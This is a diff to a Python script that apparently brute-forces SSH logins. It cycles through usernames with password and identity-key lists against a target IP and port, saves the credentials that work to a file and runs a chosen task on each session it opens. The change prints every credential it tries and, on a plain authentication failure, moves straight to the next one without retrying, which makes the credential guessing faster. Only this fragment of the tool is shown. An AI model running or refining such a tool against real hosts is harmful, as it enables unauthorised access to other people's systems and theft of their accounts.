@@ -190,6 +190,7 @@ def attempt_ssh_connection(user, credential, credential_type, target_ip, target_
             elif credential_type == 'identity':
                 session_args["identity"] = credential
 
+            print(f"attempting ssh conection: {user}:{credential}")
             session = manager.create_session(**session_args)
 
             # Correct file writing with encoding
@@ -207,11 +208,12 @@ def attempt_ssh_connection(user, credential, credential_type, target_ip, target_
                     f.write(user.encode() + ":" + credential.encode() + b'\n')
 
             execute(session, task)  # Execute the specified task
-            return True, session  # Return True if connection and task execution were successful
+            # Return True if connection and task execution were successful
+            return True, False, session
         except ChannelError as e:
             # Custom function to handle different ChannelError cases
             retry = is_retryable_error(e)
-            return retry, None
+            return False, retry, None
 
 
 def is_retryable_error(error):
@@ -305,13 +307,13 @@ for credential_type in ["password", "identity"]:
         for credential in credentials:
             retries = 0  # Retry counter
             while retries < max_retries:
-                success, session = attempt_ssh_connection(
+                success, retry, session = attempt_ssh_connection(
                     user, credential, credential_type, args.target_ip, args.target_port, args.task)
                 if success:
                     print(
                         f"Successful {credential_type} authentication: {user} with {credential}")
                     break  # Exit the credential loop if a successful connection was made
-                else:
+                elif retry:
                     retries += 1
                     print(f"Attempt {retries} failed for {user}.")
                     if retries < max_retries:
@@ -321,6 +323,9 @@ for credential_type in ["password", "identity"]:
                     else:
                         print(
                             f"Maximum retries reached for {user} with {credential_type}.")
+                else:
+                    # failed authentication - continue iterating username/credentials
+                    break
             if success:
                 break  # Exit the credential loop if a successful connection was made
         if success:
